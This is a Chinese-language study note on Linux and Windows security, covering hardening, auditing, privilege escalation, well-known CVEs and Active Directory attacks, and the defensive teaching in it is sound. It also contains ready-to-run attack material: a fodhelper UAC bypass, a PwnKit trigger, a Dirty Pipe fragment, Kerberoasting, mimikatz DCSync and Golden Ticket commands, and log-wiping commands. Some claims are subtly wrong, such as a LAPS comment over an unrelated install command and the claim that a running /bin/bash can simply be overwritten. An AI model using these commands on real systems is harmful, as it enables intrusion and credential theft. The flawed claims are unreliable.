---
title: "操作系统安全_Linux与Windows"
published: 2026-04-27
description: "《网络安全》学习笔记：操作系统安全_Linux与Windows"
tags: [学习笔记, 网络安全]
category: "网络安全"
draft: false
pinned: false
comment: true
---

# 第 3 章 操作系统安全（Linux & Windows）

## 3.1 学习目标

1. 掌握 Linux / Windows 完整权限模型（DAC / MAC / Capabilities / Namespaces）。
2. 熟练进行基线加固、日志审计、权限最小化、入侵排查。
3. 理解典型提权路径（SUID、Kernel、DLL 劫持、Token 窃取、UAC 绕过）。
4. 深入理解 Active Directory 攻击链与 Kerberos 票据结构。
5. 能使用 eBPF、Sysmon、auditd 等原生监控手段。
6. 读懂经典 CVE（Dirty Pipe、PrintNightmare、PwnKit、Baron Samedit）的代码级成因。

**能力矩阵**：

| 能力域 | 入门 | 进阶 | 精通 |
|--------|------|------|------|
| Linux | 读 `/etc/passwd`、修 sudo | 写 SELinux/AppArmor 策略 | 内核补丁 / LSM / eBPF 审计 |
| Windows | 查服务与权限 | 审计 ACL / UAC 绕过 | DCSync / 写 COM 后门 |
| AD | 枚举用户 / 组 | Kerberoast / AS-REP | 从钓鱼到 DCSync 完整链 |

---

## 3.2 Linux 安全模型总览

### 3.2.1 多层安全机制

```
┌────────────────────── 用户态 ──────────────────────┐
│  进程        / 能力位  /  命名空间  / Cgroups       │
│     │            │         │            │           │
│     ▼            ▼         ▼            ▼           │
│  DAC ── MAC (SELinux/AppArmor) ── LSM Hook          │
└─────────────────────────┬───────────────────────────┘
                          │ syscall
                ┌─────────▼─────────┐
                │   Linux 内核       │
                │   系统调用表       │
                └─────────┬─────────┘
                          │ seccomp 过滤 → hardware
                          ▼
                     硬件/虚拟化
```

### 3.2.2 DAC：文件权限

```
  -rwxr-xr--  1  alice  dev  4096  Apr 24 12:00  app
  │└┬┘└┬┘└┬┘     └─┬─┘ └┬┘
  │ │  │  │        │    └── 所属组 dev
  │ │  │  │        └── 所有者 alice
  │ │  │  └── other 权限 r--
  │ │  └── group 权限 r-x
  │ └── owner 权限 rwx
  └── 文件类型：- 普通、d 目录、l 链接、b/c 设备、s 套接字
```

权限位转十进制：`rwx = 4+2+1`。`0755 = rwxr-xr-x`。

### 3.2.3 特殊位 SUID / SGID / Sticky

| 位 | 数字 | 含义 |
|----|------|------|
| SUID | 4000 | 以文件所有者身份执行（`s` 替换 `x`） |
| SGID | 2000 | 以所属组身份执行 |
| Sticky | 1000 | 仅所有者可删除（`/tmp`） |

```bash
find / -perm -4000 -type f 2>/dev/null   # 查找所有 SUID 程序 → 提权关注点
find / -perm -2000 -type f 2>/dev/null   # SGID
```

**GTFOBins** 项目（<https://gtfobins.github.io/>）汇总了几百个"被设为 SUID 或 sudo 允许即等价 root"的二进制。

### 3.2.4 Capabilities（细粒度能力）

从 2.6.24 起 Linux 把 root 特权拆为 **~40 种能力**，典型：

| Capability | 含义 |
|-----------|------|
| CAP_NET_ADMIN | 网络配置 / tc / iptables |
| CAP_NET_BIND_SERVICE | 绑定 < 1024 端口 |
| CAP_NET_RAW | 发送 raw socket（ping/traceroute） |
| CAP_SYS_ADMIN | 几乎等价 root（挂载、调整 /proc） |
| CAP_SYS_PTRACE | ptrace 任意进程 |
| CAP_DAC_READ_SEARCH | 绕过 DAC 读取 |
| CAP_BPF | 加载 eBPF（5.8+） |
| CAP_PERFMON | perf_event_open |

```bash
getcap -r / 2>/dev/null                  # 枚举带能力的二进制
setcap cap_net_raw+ep ./my_tool          # 赋予
capsh --print                            # 查看当前进程
```

**提权陷阱**：`cap_dac_read_search` 足以读 `/etc/shadow`；`cap_net_admin + cap_net_raw` 足以改主机防火墙。

### 3.2.5 Namespaces + Cgroups（容器基石）

```
Namespace     隔离对象                    常用工具
──────────────────────────────────────────────
pid           进程 ID                    unshare --pid
net           网络栈                     ip netns add net1
mnt           挂载点                     unshare --mount
uts           主机名                     unshare --uts
ipc           IPC 资源                   unshare --ipc
user          UID/GID 映射               unshare --user
cgroup        cgroup 根                  unshare --cgroup
time          CLOCK_MONOTONIC 偏移        5.6+
```

Cgroups v2 统一层级，支持 CPU/Memory/IO/PID/Device 限额。

**逃逸点**：
- 用户命名空间 + SETUID 误配置（CVE-2022-0185）
- `runC` 对 `/proc/self/exe` 的不当处理（CVE-2019-5736）
- 特权容器 (`--privileged`) → 所有 capability，直接访问宿主
- 挂载宿主 `/var/run/docker.sock` → 控制 Docker daemon
- `cgroup.procs` 可写 → `release_agent` 逃逸（CVE-2022-0492）

### 3.2.6 SELinux vs AppArmor

| 项 | SELinux | AppArmor |
|----|---------|----------|
| 模型 | Type Enforcement + MLS | Path-based |
| 粒度 | 标签打在 inode 上 | 按绝对路径匹配 |
| 策略语言 | `.te` / `.if` / `.fc` | `abstractions/*` |
| 易用性 | 复杂，学习曲线陡 | 直观 |
| 发行版 | RHEL / Fedora / Android | Ubuntu / Debian / SUSE |

**SELinux `.te` 策略样例**：

```
module myapp 1.0;

require {
    type init_t, httpd_t, http_port_t;
    class tcp_socket name_connect;
}

allow httpd_t http_port_t:tcp_socket name_connect;
```

**AppArmor profile 样例** `/etc/apparmor.d/usr.bin.myapp`：

```
#include <tunables/global>
/usr/bin/myapp {
  #include <abstractions/base>
  capability net_bind_service,
  network inet stream,
  /etc/myapp/ r,
  /etc/myapp/** r,
  /var/log/myapp.log w,
  deny /etc/shadow r,
  deny @{HOME}/.ssh/** rw,
}
```

### 3.2.7 PAM 认证链

`/etc/pam.d/sshd` 决定 SSH 的认证流程：

```
auth       required   pam_faillock.so preauth deny=5 unlock_time=900
auth       required   pam_unix.so nullok_secure try_first_pass
auth       optional   pam_google_authenticator.so
account    required   pam_nologin.so
account    required   pam_unix.so
password   requisite  pam_pwquality.so retry=3 minlen=12 ucredit=-1
password   required   pam_unix.so sha512 shadow use_authtok
session    required   pam_limits.so
session    required   pam_unix.so
```

**后门手法**：攻击者替换 `pam_unix.so`，加入"万能密码"分支；或者新增 `auth sufficient pam_permit.so` 放行。

检测：比对 `sha256sum /lib/x86_64-linux-gnu/security/pam_*.so` 与发行版官方包。

### 3.2.8 审计子系统（auditd + eBPF）

auditd 规则 `/etc/audit/rules.d/hard.rules`：

```
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k privilege
-a always,exit -F arch=b64 -S execve -F key=execve
-a always,exit -F arch=b64 -S connect -F key=net
```

eBPF 现代替代：`bpftrace` 一行监控 execve：

```bash
bpftrace -e 'tracepoint:syscalls:sys_enter_execve {
    printf("%d %s\n", pid, str(args->filename));
}'
```

更完整：参考 Falco / Tracee / BCC 项目。

---

## 3.3 Linux 加固清单（Hardening Checklist）

### 账户

- [ ] 禁用 root SSH 登录：`PermitRootLogin no`
- [ ] 禁用空口令 / 不用账号：`passwd -l username`
- [ ] 强制密码复杂度（`pam_pwquality`）
- [ ] 口令过期策略（`chage -M 90`）
- [ ] MFA（`pam_google_authenticator`）

### SSH

- [ ] 禁用密码登录，强制公钥：`PasswordAuthentication no`
- [ ] 限制登录源：`AllowUsers alice@10.0.0.0/8`
- [ ] `MaxAuthTries 3`、`LoginGraceTime 30s`
- [ ] 禁用 SSH v1、启用 `KexAlgorithms` 白名单（curve25519-sha256 等）

### 网络

- [ ] 关闭 IPv6（若不用）
- [ ] `iptables` / `nftables` 入出站策略默认 DROP
- [ ] 禁用 `source routing`、`icmp redirect`
- [ ] 启用 SYN Cookie：`net.ipv4.tcp_syncookies=1`
- [ ] `net.ipv4.conf.all.rp_filter=1`（反向路径过滤，防 IP spoof）

### 文件系统

- [ ] `/tmp` `/var/tmp` 独立挂载 + `noexec,nosuid,nodev`
- [ ] 启用 `auditd`、记录关键文件（`/etc/passwd` `/etc/shadow`）
- [ ] `chattr +i` 关键配置文件
- [ ] 磁盘加密 LUKS2（工作站类）

### 服务

- [ ] 最小化安装：移除 `telnet` `rsh` `rlogin` `ftp`
- [ ] 关闭未使用端口：`ss -tunlp`
- [ ] 启用 `fail2ban`
- [ ] 容器化 / 沙箱关键服务

### 内核

- [ ] 启用 SELinux / AppArmor
- [ ] `kernel.kptr_restrict=2`、`kernel.dmesg_restrict=1`、`kernel.unprivileged_userns_clone=0`
- [ ] 模块签名：`CONFIG_MODULE_SIG_FORCE=y`
- [ ] 安装 `unattended-upgrades` 自动安全补丁

### Ubuntu 22.04 加固脚本（片段）

```bash
#!/usr/bin/env bash
set -euo pipefail

# 1. 更新
apt-get update && apt-get -y upgrade && apt-get -y dist-upgrade
apt-get -y install unattended-upgrades fail2ban apparmor-utils auditd ufw

# 2. SSH
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
echo 'AllowUsers admin' >> /etc/ssh/sshd_config
systemctl restart sshd

# 3. sysctl
cat >/etc/sysctl.d/99-hardening.conf <<'EOF'
net.ipv4.tcp_syncookies=1
net.ipv4.conf.all.rp_filter=1
net.ipv4.conf.all.accept_redirects=0
net.ipv4.conf.all.send_redirects=0
net.ipv4.icmp_echo_ignore_broadcasts=1
kernel.randomize_va_space=2
kernel.kptr_restrict=2
kernel.dmesg_restrict=1
kernel.unprivileged_userns_clone=0
fs.protected_hardlinks=1
fs.protected_symlinks=1
EOF
sysctl --system

# 4. UFW
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw --force enable

# 5. auditd
cat >/etc/audit/rules.d/hard.rules <<'EOF'
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k privilege
-a always,exit -F arch=b64 -S execve -F key=execve
EOF
augenrules --load

# 6. fail2ban
cat >/etc/fail2ban/jail.d/sshd.conf <<'EOF'
[sshd]
enabled = true
maxretry = 5
findtime = 10m
bantime = 1h
EOF
systemctl restart fail2ban
```

---

## 3.4 Linux 提权深度剖析

### 3.4.1 路径总览

| 路径 | 关键命令 / 工具 |
|------|-----------------|
| 配置错误的 SUID | `find / -perm -4000` → GTFOBins |
| sudo 配置漏洞 | `sudo -l`，检索 GTFOBins |
| cron / systemd timer 可写脚本 | `ls -la /etc/cron*` |
| LD_PRELOAD / LD_LIBRARY_PATH | 环境变量劫持 |
| 内核漏洞 | Dirty COW、Dirty Pipe、OverlayFS |
| Docker / Kubernetes 逃逸 | 特权容器、挂载 `/var/run/docker.sock` |
| 可写的 `/etc/passwd` | 写入新的 root 行 |
| Polkit / Dbus 漏洞 | PwnKit / Baron Samedit |

**自动化工具**：`LinPEAS` / `LinEnum` / `pspy`。

### 3.4.2 CVE 深度复盘 1：Dirty Pipe (CVE-2022-0847)

**成因**：5.8 引入 `splice()` 后，pipe buffer 的 `flags` 字段在 `copy_page_to_iter_pipe` 中未被重新初始化，导致攻击者可以向只读文件映射的 pipe 页写入数据：

```c
// 关键：新增的 pipe_buf 未清 PIPE_BUF_FLAG_CAN_MERGE
static size_t copy_page_to_iter_pipe(struct page *page, size_t offset,
                                     size_t bytes, struct iov_iter *i) {
    struct pipe_inode_info *pipe = i->pipe;
    struct pipe_buffer *buf = &pipe->bufs[(pipe->head - 1) & (pipe->ring_size - 1)];
    if (offset == buf->offset + buf->len) {
        buf->len += bytes;
        i->iov_offset = offset + bytes;
        i->count -= bytes;
        return bytes;
    }
    ...
    // 新加入的 buf->flags 没被显式清 0
    buf->flags = PIPE_BUF_FLAG_CAN_MERGE; // ← 问题所在
}
```

**PoC 片段**（精简）：

```c
int fd = open(path, O_RDONLY);
pipe2(p, 0);
splice(fd, &offset, p[1], NULL, 1, 0);   // page 进入 pipe，flags 被写入 CAN_MERGE
write(p[1], data, strlen(data));         // 数据落到只读文件的 page cache
```

**影响**：任意只读文件被覆盖，含 `/etc/passwd`、容器里的 `/usr/bin/su`。

**补丁对比**：

```diff
- buf->flags = PIPE_BUF_FLAG_CAN_MERGE;
+ buf->flags = 0;
```

**检测**：auditd 监控 `splice` + `write` 的异常组合；YARA 匹配公开 PoC 字节流。

### 3.4.3 CVE 深度复盘 2：Baron Samedit (CVE-2021-3156)

sudo `set_cmnd()` 在解析反斜杠转义时未区分 shell 模式 vs 非 shell 模式，造成堆溢出。

```c
// 漏洞版
for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
    while (*from) {
        if (from[0] == '\\' && !isspace((unsigned char)from[1]))
            from++;                      // ← 越界读
        *to++ = *from++;
    }
    *to++ = ' ';
}
```

构造 `sudoedit -s 'A\' + A*N` 触发堆越界写。

补丁：sudo 1.9.5p2 中对 `sudoedit` 模式单独处理。

### 3.4.4 CVE 深度复盘 3：PwnKit (CVE-2021-4034)

pkexec 对 argv 的处理：

```c
int main(int argc, char *argv[]) {
    n = 1;
    for (;;) {
        if (path[0] == '/') break;
        if (n >= argc) break;            // ← argc=0 时直接跳过
        ...
    }
}
```

当 `argc=0`（可通过 `execve` 传）时，`argv[1]` 越界指向环境变量区，攻击者可控 → 注入 `LD_LIBRARY_PATH` 等敏感变量加载恶意 `.so`。

```c
char *const argv[] = { NULL };
char *const envp[] = { "pwn", "PATH=GCONV_PATH=.", "CHARSET=x", "SHELL=x", NULL };
execve("/usr/bin/pkexec", argv, envp);
```

补丁：`polkit 0.120` 对 `argc < 1` 直接退出。

### 3.4.5 CVE 深度复盘 4：OverlayFS 权限绕过 (CVE-2023-0386)

非特权用户命名空间 + overlayfs `copy_up` 未正确处理 capability → 本地提权。

### 3.4.6 内核漏洞利用通用思路

```
1. 找可触发原语（UAF / heap overflow / OOB write）
2. 构造堆布局（msg_msg / simple_xattr / pipe_buffer 是经典喷射对象）
3. 劫持某个内核指针（cred / modprobe_path / core_pattern）
4. 提权：commit_creds(prepare_kernel_cred(0)) 或改写 modprobe_path 到 shell
5. 返回用户态并清理副作用
```

---

## 3.5 Windows 安全基础

### 3.5.1 账户与令牌

- 本地账户（SAM 数据库，`C:\Windows\System32\config\SAM`）
- 域账户（存于域控 AD 数据库 `ntds.dit`）
- 组：Administrators / Domain Admins / Enterprise Admins

### 3.5.2 访问令牌结构

```
Access Token {
  User SID         (例：S-1-5-21-...-1105)
  Group SIDs       [多个]
  Privileges       (Luid, Attributes) 列表
  Owner / PrimaryGroup
  DefaultDacl
  LogonId
  TokenType        Primary / Impersonation
  ImpersonationLevel Anonymous/Identification/Impersonation/Delegation
}
```

关键特权：

| 特权 | 危险性 |
|------|--------|
| SeDebugPrivilege | 读取/写入任意进程，`mimikatz` 必备 |
| SeImpersonatePrivilege | 模拟其他令牌 → Potato 家族提权 |
| SeBackupPrivilege | 绕过 DACL 读所有文件 |
| SeRestorePrivilege | 写任意文件 |
| SeTakeOwnershipPrivilege | 取得任意对象所有权 |
| SeLoadDriverPrivilege | 加载驱动 → BYOVD |
| SeTcbPrivilege | "作为操作系统组件" |

`whoami /priv` 查看当前进程特权。

### 3.5.3 UAC 与完整性级别

| 级别 | 含义 | SID |
|------|------|-----|
| Untrusted | 受限沙箱 | S-1-16-0 |
| Low | 浏览器沙箱 | S-1-16-4096 |
| Medium | 普通用户默认 | S-1-16-8192 |
| Medium+ | 标准管理员（未提升） | S-1-16-8448 |
| High | 管理员点击"提升权限"后 | S-1-16-12288 |
| System | 内核、服务 | S-1-16-16384 |

### 3.5.4 UAC 绕过技术速查

| 技术 | 原理 |
|------|------|
| `fodhelper.exe` 注册表劫持 | HKCU:\Software\Classes\ms-settings\Shell\Open\command |
| `eventvwr.exe` + mscfile | 类似，白名单 autoElevate |
| `ComputerDefaults.exe` | 同上 |
| COM 劫持 (ICMLuaUtil) | 滥用 auto-elevated COM 对象 |
| sdclt.exe / wsreset.exe | windows-defender 白名单 |
| DLL 劫持（`srrstr.dll`） | 白名单程序载恶意 DLL |

**UAC 绕过示例**（fodhelper）：

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "DelegateExecute" -Value ""
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "(Default)" -Value "cmd.exe /c start cmd.exe"
Start-Process "fodhelper.exe"
```

### 3.5.5 Windows 提权常用路径

| 路径 | 工具 |
|------|------|
| 未加引号的服务路径 | `wmic service get name,pathname` |
| AlwaysInstallElevated 注册表 | 生成 MSI + `msiexec` |
| 不安全的服务权限 | `accesschk.exe` |
| DLL 劫持 | `Procmon` 找加载失败 DLL |
| Token Impersonation | `Incognito`、`JuicyPotato` / `PrintSpoofer` / `RoguePotato` |
| 凭据抓取 | `mimikatz sekurlsa::logonpasswords` |
| SeDebugPrivilege / SeImpersonatePrivilege 滥用 | `whoami /priv` |
| BYOVD（Bring Your Own Vulnerable Driver） | 载入带漏洞的厂商驱动，特权任写 |

**自动化工具**：`WinPEAS`、`PowerUp.ps1`、`Seatbelt`、`SharpUp`。

### 3.5.6 CVE 深度复盘 5：PrintNightmare (CVE-2021-34527)

Windows Print Spooler 的 `RpcAddPrinterDriverEx` RPC 接口允许远程加载任意驱动 DLL：

```c
// 简化伪代码
HRESULT RpcAddPrinterDriverEx(..., DRIVER_INFO_2 *pDriverInfo, DWORD dwFileCopyFlags) {
    if (!IsAdministrator() && !(dwFileCopyFlags & APD_COPY_FROM_DIRECTORY)) {
        // 原本应 require 管理员
        return ERROR_ACCESS_DENIED;
    }
    // ...
    LoadPrinterDriver(pDriverInfo->pDriverPath);    // 直接加载
}
```

**PoC**：`mimikatz` / `SharpPrintNightmare` 使用低权用户通过 SMB named pipe 调用该 RPC，指向攻击者 SMB 共享中的恶意 DLL，Spooler 服务以 SYSTEM 加载 → 全局 RCE。

补丁：2021-07-06 KB 5004945 + 要求管理员特权才能远程添加驱动；同时引入 `RestrictDriverInstallationToAdministrators` 策略。

### 3.5.7 Windows 加固要点

```powershell
# 禁 SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# 禁用 LLMNR / NetBIOS over TCP/IP（防 Responder）
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' `
    -Name 'EnableMulticast' -Value 0

# 禁止 Print Spooler（若不需要）
Stop-Service Spooler -Force
Set-Service -Name Spooler -StartupType Disabled

# LAPS：本地管理员密码随机化
Install-WindowsFeature AD-Domain-Services

# Credential Guard
bcdedit /set hypervisorlaunchtype auto
```

---

## 3.6 Active Directory 深度

### 3.6.1 AD 攻击链全景

```
外网钓鱼 / 暴露服务
      │ Foothold
      ▼
本地枚举 (Seatbelt / winPEAS)
      │ Local PrivEsc
      ▼
域内枚举 (BloodHound / PowerView)
      │
   ┌──┴──┐
   ▼     ▼
Kerberoast   AS-REP Roasting  → 离线爆破
      │
   NTLM Relay / Zerologon / PrintNightmare / ADCS ESC*
      │
      ▼
获取域管或 krbtgt
      │
      ▼
DCSync / Golden Ticket / Silver Ticket / DCShadow → 持久化
```

### 3.6.2 Kerberos 认证 4 步

```
Client                               KDC                     Service
  │ AS-REQ (username, pre-auth) ──▶  │
  │ ◀── AS-REP (TGT enc/krbtgt, sess key) ─────────────────│
  │ TGS-REQ (TGT, SPN) ──────────▶  │
  │ ◀── TGS-REP (service ticket) ───│
  │ AP-REQ (service ticket) ─────────────────────────────▶ │
  │ ◀── AP-REP ────────────────────────────────────────── │
```

**票据结构**：

```
Ticket = Enc_Kkrbtgt {
    flags, key (session key), realm, cname,
    authtime, starttime, endtime, renew_till,
    PAC  ← Privilege Attribute Certificate (SID 清单、组、签名)
}
```

PAC 里的 `Server Signature` 由 `krbtgt` hash 计算，只有 KDC 能验证 → 掌握 `krbtgt` 等于整域生死。

### 3.6.3 Kerberoasting 原理

任意域用户可向 KDC 请求"某服务账户的 TGS"，TGS 使用服务账户 NTLM hash 加密 → 离线爆破。

```powershell
# 1. 枚举带 SPN 的用户（通常为服务账户）
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# 2. 请求 TGS
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
    -ArgumentList "MSSQLSvc/sql01.corp.local:1433"

# 3. klist 导出 → hashcat 模式 13100
hashcat -m 13100 tgs.txt rockyou.txt
```

### 3.6.4 DCSync / DCShadow

- **DCSync**：利用复制权限（Replicating Directory Changes）调用 `DRSUAPI` 同步任意账户的 NTLM 哈希。
- **DCShadow**：把普通机器伪造为 DC，向真 DC 发出复制 → 可添加组成员、后门属性。

```powershell
# mimikatz
lsadump::dcsync /domain:corp.local /user:krbtgt
```

### 3.6.5 Golden Ticket / Silver Ticket

- **Golden**：知道 `krbtgt` 哈希 → 伪造任意用户的 TGT → 重放 → SYSTEM 权限访问任何服务。
- **Silver**：知道 **某个服务账户** 的哈希 → 伪造该服务的 TGS → 仅控制该服务。

```powershell
kerberos::golden /user:Administrator /domain:corp.local `
    /sid:S-1-5-21-... /krbtgt:<NTLM> /ptt
```

### 3.6.6 ADCS 攻击（ESC1–ESC15）

- **ESC1**：模板允许 SAN 自由指定 → 申请指向"Domain Admin"的证书 → 使用 PKINIT 登录。
- **ESC8**：NTLM Relay 到 HTTP 证书注册端点 → 获取 DC 计算机证书。
- **ESC15**：仅 2024 公开，利用 `OldCertTemplates` 属性重置。

工具：`Certify.exe`、`Certipy`、`PetitPotam`、`ntlmrelayx`。

### 3.6.7 BloodHound 典型查询（Cypher）

```cypher
// 找到从"Kerberoastable 用户"到"Domain Admins"的最短路径
MATCH p=shortestPath(
    (u:User {hasspn: true})-[*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
) RETURN p

// 有 DCSync 权限的账户
MATCH (n)-[:GetChanges|GetChangesAll]->(d:Domain)
RETURN n.name, d.name

// 横向：哪些用户对本机有 CanRDP
MATCH (u:User)-[:CanRDP]->(c:Computer {name:"WS01.CORP.LOCAL"})
RETURN u.name
```

### 3.6.8 关键工具

- **BloodHound** / **SharpHound** - 图化攻击路径
- **Impacket** - Python 套件（`secretsdump.py`、`GetNPUsers.py`、`wmiexec.py`、`ntlmrelayx.py`）
- **Rubeus** - Kerberos 工具
- **CrackMapExec / NetExec** - 内网瑞士军刀
- **PowerView** / **AD Module** - 枚举
- **Certipy** - ADCS 攻防
- **mimikatz** - 凭据/票据

---

## 3.7 日志与审计

### 3.7.1 Linux 日志矩阵

| 路径 | 内容 |
|------|------|
| `/var/log/auth.log` `/var/log/secure` | 登录 / sudo |
| `/var/log/syslog` `/var/log/messages` | 系统 |
| `/var/log/audit/audit.log` | `auditd` |
| `/var/log/journal/` | `systemd-journald`（二进制，`journalctl` 读取） |
| `~/.bash_history` | 历史命令（易被清空） |
| `last` `lastb` `w` | 登录记录 |

**反取证陷阱**：
- `unset HISTFILE` / `export HISTSIZE=0` → history 不记录
- `/var/log/wtmp` 可被 `utmpdump` 编辑
- `journalctl --rotate && journalctl --vacuum-size=1K` 清理 journal

防御：把日志转发到集中式 SIEM（rsyslog → Kafka → Elastic）以防本地清理。

### 3.7.2 Windows 事件 ID 速查

| ID | 含义 |
|----|------|
| 4624 | 成功登录（查 LogonType：2 本地、3 网络、10 RDP、11 CachedInteractive） |
| 4625 | 登录失败 |
| 4648 | 使用显式凭据登录（常见于横向） |
| 4672 | 特权登录 |
| 4688 | 新进程创建（配合 `AuditSubcategory` 开启命令行审计） |
| 4697 | 新服务安装 |
| 4698 | 计划任务创建 |
| 4720 | 新账户 |
| 4728/4732/4756 | 添加到"特权组" |
| 5140 / 5145 | 网络共享访问 |
| 1102 | 安全日志被清空（攻击者踪迹！） |
| 7045 | 服务安装（System） |

推荐 **Sysmon**：更细粒度日志（进程树、网络连接、文件哈希）。

### 3.7.3 Sysmon 典型规则

```xml
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <RuleGroup name="Critical Creds Dump" groupRelation="or">
      <ProcessAccess onmatch="include">
        <TargetImage condition="contains">lsass.exe</TargetImage>
        <GrantedAccess condition="contains">0x1010</GrantedAccess>
      </ProcessAccess>
    </RuleGroup>
    <RuleGroup name="Persistence" groupRelation="or">
      <RegistryEvent onmatch="include">
        <TargetObject condition="contains">\Run</TargetObject>
        <TargetObject condition="contains">\RunOnce</TargetObject>
      </RegistryEvent>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

---

## 3.8 主机入侵排查流程

```
1. 账户：last / w / /etc/passwd、shadow、Administrators 组
2. 进程：ps -ef --forest / ss -tunlp / Tasklist /svc / Procmon
3. 网络连接：netstat / ss，看异常外联
4. 启动项：crontab -l / systemd timer / 注册表 Run / 计划任务 / WMI 订阅
5. 文件：近期修改的文件、SUID、临时目录、ADS（Windows alternate data stream）
6. 日志：auth.log、事件日志、Web 服务器日志
7. 后门：SSH authorized_keys、PAM 后门、LKM rootkit、Web shell、Skeleton Key
8. 内存：volatility / Rekall，确认可疑进程、注入的 DLL
9. 磁盘：Sleuthkit autopsy / fls，找删除痕迹
10. 时间线：log2timeline / plaso 整合 MFT + 日志
```

常用工具：`chkrootkit` / `rkhunter` / `ClamAV` / `osquery` / `Sysmon` / `Wazuh` / `Velociraptor`。

### 3.8.1 osquery 检测样例

```sql
-- 查找 SUID 可执行文件
SELECT path, uid, mode FROM suid_bin;

-- 监控 /etc/hosts 变动
SELECT * FROM file_events
 WHERE target_path='/etc/hosts';

-- 异常 ssh 登录
SELECT * FROM logged_in_users WHERE tty NOT IN ('ssh','tty1','console');
```

---

## 3.9 容器与虚拟化安全

### 3.9.1 Docker 安全要点

- 永远不用 `--privileged`
- Drop 所有 capability 再按需加回：`--cap-drop=ALL --cap-add=NET_BIND_SERVICE`
- 只读根文件系统：`--read-only --tmpfs /tmp`
- 用户命名空间：`dockerd --userns-remap=default`
- AppArmor / Seccomp profile 明确列白
- Seccomp 默认 profile：约 44 个系统调用被禁

### 3.9.2 Kubernetes 安全

- Pod Security Admission（2023 GA 替代 PSP）：`restricted` / `baseline` / `privileged`
- NetworkPolicy 零信任默认拒绝
- RBAC 最小权限（避免 `cluster-admin` 绑定到普通 ServiceAccount）
- 镜像来源签名（cosign / Sigstore）
- 运行时：Falco / Tetragon / Tracee 内核行为审计

### 3.9.3 经典容器逃逸 CVE

| CVE | 类别 |
|-----|------|
| CVE-2019-5736 | runC 覆盖宿主 `/proc/self/exe` |
| CVE-2022-0185 | FSCONFIG_CMD_CREATE 堆溢出 |
| CVE-2022-0492 | cgroup v1 `release_agent` 未限权 |
| CVE-2024-0132 | NVIDIA GPU Container Toolkit TOCTOU |

---

## 3.10 练习题

1. 解释 `chmod 4755 /bin/myapp` 做了什么？可能的提权风险？
2. 写一个 bash 脚本检测当前机器是否启用了 SELinux enforcing。
3. Sudo 配置 `%dev ALL=(ALL) NOPASSWD: /usr/bin/vim /etc/myapp.conf` 有什么风险？
4. 如何检测一台 Linux 机器是否被植入 LKM rootkit？
5. 分析 Dirty Pipe PoC 的关键步骤，写出核心三行。
6. Windows 中 `SeBackupPrivilege` 单独持有为什么等同于"读所有文件"？
7. 什么是 Kerberoasting？用什么条件能发动？
8. DCSync 与 DCShadow 的区别？哪一个更隐蔽？
9. 简述 PrintNightmare 的 RPC 调用链与补丁思路。
10. 如何用 Sysmon 识别"通过 `procdump -ma lsass.exe` 转储 LSASS"？

### 参考答案要点

1. 设置 SUID 位 → 调用者以 root 执行；若 `myapp` 能 spawn shell（`system()`）或读取 secret，则直接提权。
2. `getenforce || sestatus | grep '^SELinux status'`
3. vim 可 `:!sh` → 直接 root。
4. `kmod list` + `dmesg` 对比、`lsof /dev/kmem`、用 `/sys/module/*` 枚举、比对 `lsmod` 与 `/proc/modules`；chkrootkit / rkhunter / unhide。
5. `splice(file, ...) → write(pipe, ...) → read 原文件`，利用 `PIPE_BUF_FLAG_CAN_MERGE` 残留。
6. `SeBackupPrivilege` 绕过 DACL 访问检查，可读 SAM/SECURITY hive 等。
7. 任意域用户请求 SPN 账户的 TGS；该 TGS 用服务账户 NTLM hash 加密 → 离线爆破。前提：目标账户 hasspn=true。
8. DCSync 复制现有账户哈希；DCShadow 伪装 DC 后反向推送。DCShadow 更隐蔽，因为它不产生 4662 审计事件。
9. `RpcAddPrinterDriverEx` 可由普通用户调用加载任意 DLL → Spooler 以 SYSTEM 载入；补丁要求管理员 + `RestrictDriverInstallationToAdministrators=1`。
10. Sysmon Event ID 10 `ProcessAccess` TargetImage=lsass.exe, GrantedAccess=0x1010/0x1410/0x1438。

---

## 3.11 面试高频考点（附参考答案）

**Q1**：Linux 文件权限 `0755` 的含义？
- 所有者可读写执行，组/其他只读执行，常用于可执行程序。

**Q2**：Linux 与 Windows 特权模型的本质差异？
- Linux：进程持有 UID + 能力位；Windows：进程持有 Token，Token 包含组 SID + 特权集合 + 完整性级别。

**Q3**：如何在不重启的前提下替换已运行的 `/bin/bash`？
- `/bin/bash` 被 mmap 后内核引用，但通过 `open(O_RDWR)` + `write` 到相同路径（对没开 SELinux 的系统）即可覆盖；新进程加载时取到新版本。

**Q4**：Kerberos 认证 AS-REQ / AS-REP / TGS-REQ / TGS-REP 四步要点？
- AS-REQ 带时间戳预认证；AS-REP 含 TGT（KDC 用 krbtgt hash 加密）+ 会话密钥（用户密码哈希加密）；TGS-REQ 用 TGT 申请服务票据；TGS-REP 返回由服务账户哈希加密的 TGS。

**Q5**：Pass-the-Hash 与 Pass-the-Ticket 区别？
- PtH：提供 NTLM hash 完成 NTLM 挑战响应；PtT：直接注入 Kerberos 票据。PtT 更隐蔽、且 NTLM 可能已被禁用。

**Q6**：SeImpersonatePrivilege 为什么危险？
- 能模拟所有向其进程做过 RPC / 命名管道连接的令牌；配合 Print Spooler / DCOM 强制 SYSTEM 连接自己 → 获得 SYSTEM 令牌。

**Q7**：Golden Ticket 为何"万能"？
